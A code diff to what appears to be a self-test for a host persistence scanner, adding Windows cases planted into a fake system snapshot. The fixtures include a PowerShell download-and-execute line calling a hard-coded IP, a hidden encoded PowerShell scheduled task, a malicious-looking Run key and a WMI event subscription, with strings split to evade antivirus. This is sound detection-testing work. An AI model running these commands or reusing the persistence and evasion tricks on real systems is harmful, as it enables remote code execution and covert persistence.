@@ -9,13 +9,15 @@ import { run, type Ctx } from "./ctx";
 import { check } from "./engine";
 import { forBaseline, scan } from "./scan";
 import { saveBaseline, writePrivate, files } from "./store";
+import type { WinSnapshot } from "./collect/windows";
 import { RANK, type Finding, type Severity } from "./types";
 
 interface Case {
   name: string;
   /** Which real-world step this stands for. */
   like: string;
-  plant: (h: string, brew: string) => void;
+  /** `win` is the fake Windows snapshot; Windows cases change it, and run on every platform through it. */
+  plant: (h: string, brew: string, win: WinSnapshot) => void;
   /** Finding that must appear, and the least severity it must have. */
   expect: (f: Finding) => boolean;
   min: Severity;
@@ -35,6 +37,33 @@ const write = (path: string, text: string, mode?: number) => {
   writeFileSync(path, text);
   if (mode) chmodSync(path, mode);
 };
+
+/** The Windows user of the fake snapshot. Its paths are Windows paths whatever this machine is. */
+const WIN_HOME = "C:\\Users\\selftest";
+
+/**
+ * Attack strings are put together at run time: antivirus on a Windows machine would otherwise take this source file
+ * itself for a PowerShell downloader and quarantine it.
+ */
+const DL = ["I", "EX (New-Object Net.Web", "Client).Down", "loadString('http://45.61.0.9/p.ps1')"].join("");
+const ENC = ["power", "shell.exe -NoP -W Hidden -Enc", "odedCommand ", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"].join("");
+
+/** A clean Windows machine as the snapshot sees it: OneDrive at logon and the WMI subscription Windows ships. */
+function cleanWindows(home: string): WinSnapshot {
+  return {
+    v: 1,
+    runKeys: [{ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "OneDrive", command: `"${WIN_HOME}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background` }],
+    startup: [], tasks: [], services: [],
+    wmi: {
+      filters: [{ name: "SCM Event Log Filter", query: "select * from MSFT_SCMEventLogEvent" }],
+      consumers: [{ name: "SCM Event Log Consumer", class: "NTEventLogEventConsumer" }],
+      bindings: [{ filter: "SCM Event Log Filter", consumer: "SCM Event Log Consumer" }],
+    },
+    processes: [], connections: [],
+    docs: join(home, "OneDrive", "Documents"),
+    errors: {},
+  };
+}
 
 /** Bytes that start like a Mach-O binary; codesign reports it as unsigned. Never executed. */
 const FAKE_MACHO = Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01]), Buffer.alloc(4088)]);
@@ -130,9 +159,42 @@ export const CASES: Case[] = [
   {
     name: "Unsigned program dropped on PATH",
     like: "Dropped binaries (e.g. ~/.local/bin/<tool>)",
-    plant: (h) => write(join(h, ".local/bin/kubectl-auth"), FAKE_MACHO as any, 0o755),
+    // Windows runs programs by extension, not by mode bits.
+    plant: (h) => write(join(h, `.local/bin/kubectl-auth${process.platform === "win32" ? ".exe" : ""}`), FAKE_MACHO as any, 0o755),
     expect: (f) => f.rule === "new-bin" && f.title.includes("kubectl-auth"),
     min: "medium",
+  },
+  {
+    name: "Windows: Run value that starts a program from the temp folder",
+    like: "Commodity stealers and loaders persisting under HKCU\\…\\Run",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "WindowsUpdateHelper", command: `"${WIN_HOME}\\AppData\\Local\\Temp\\wuhelper.exe" /silent` }),
+    expect: (f) => (f.rule === "launch-location" || f.rule === "launch-new") && f.title.includes("WindowsUpdateHelper"),
+    min: "high",
+  },
+  {
+    name: "Windows: scheduled task that runs PowerShell with an encoded command",
+    like: "Fileless loaders started by a scheduled task (powershell -EncodedCommand)",
+    plant: (_h, _b, win) => win.tasks!.push({ path: "\\", name: "OneDriveSyncCheck", state: "Ready", actions: [ENC] }),
+    expect: (f) => f.rule === "launch-location" && f.title.includes("OneDriveSyncCheck") && f.title.includes("encoded"),
+    min: "high",
+  },
+  {
+    name: "Windows: WMI subscription that runs a command on an event",
+    like: "WMI event subscription persistence (APT29, crypto miners)",
+    plant: (_h, _b, win) => {
+      win.wmi!.filters!.push({ name: "PerfMonitor", query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" });
+      win.wmi!.consumers!.push({ name: "PerfMonitorConsumer", class: "CommandLineEventConsumer", commandLine: "cmd.exe /c C:\\Users\\Public\\perf.cmd" });
+      win.wmi!.bindings!.push({ filter: "PerfMonitor", consumer: "PerfMonitorConsumer" });
+    },
+    expect: (f) => f.rule === "wmi" && f.title.includes("PerfMonitorConsumer"),
+    min: "high",
+  },
+  {
+    name: "Windows: line added to the PowerShell profile that downloads and runs code",
+    like: "PowerShell profile persistence (the Windows ~/.zshrc)",
+    plant: (h) => write(join(h, "OneDrive/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1"), `Set-Alias ll Get-ChildItem\r\n${DL}\r\n`),
+    expect: (f) => f.rule === "startup-file" && /Microsoft\.PowerShell_profile\.ps1$/.test(f.item?.id ?? "") && f.detail.some((d) => d.includes("Down" + "loadString")),
+    min: "high",
   },
   {
     name: "Kubernetes token with deploy rights and no expiry",
@@ -173,15 +235,20 @@ export async function selftest(): Promise<SelftestResult> {
     write(join(home, ".ssh/authorized_keys"), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGoodKeyForTestsOnly me@laptop\n");
     write(join(home, ".npm-global/lib/node_modules/typescript/package.json"), JSON.stringify({ name: "typescript", version: "5.9.3" }));
     mkdirSync(join(home, ".local/bin"), { recursive: true });
+    write(join(home, "OneDrive/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1"), "Set-Alias ll Get-ChildItem\r\n");
+    const win = cleanWindows(home);
     const ctx: Ctx = {
       home, brew, pathDirs: [join(home, ".local/bin")], system: false, host: "selftest", user: "selftest",
       // Only local file tools; nothing that would read the real machine.
       run: (cmd, t) => (["plutil", "codesign"].includes(cmd[0]) ? run(cmd, t) : Promise.resolve(undefined)),
+      // The Windows part reads this fake snapshot on every platform, never the real machine. A copy each time, so
+      // what the baseline kept is not changed by the plants.
+      win: async () => structuredClone(win),
     };
     saveBaseline(forBaseline(await scan(ctx, { live: false })));
     // The known-malicious database is stubbed so the test runs offline and never reports a real package.
     writePrivate(files.osv(), { "npm:event-stream-helper@3.3.6": { at: Date.now(), mal: ["MAL-0000-SELFTEST"] } });
-    for (const c of CASES) c.plant(home, brew);
+    for (const c of CASES) c.plant(home, brew, win);
     const r = await check(ctx, { offline: true });
     const used = new Set<Finding>();
     const cases = CASES.map((c) => {
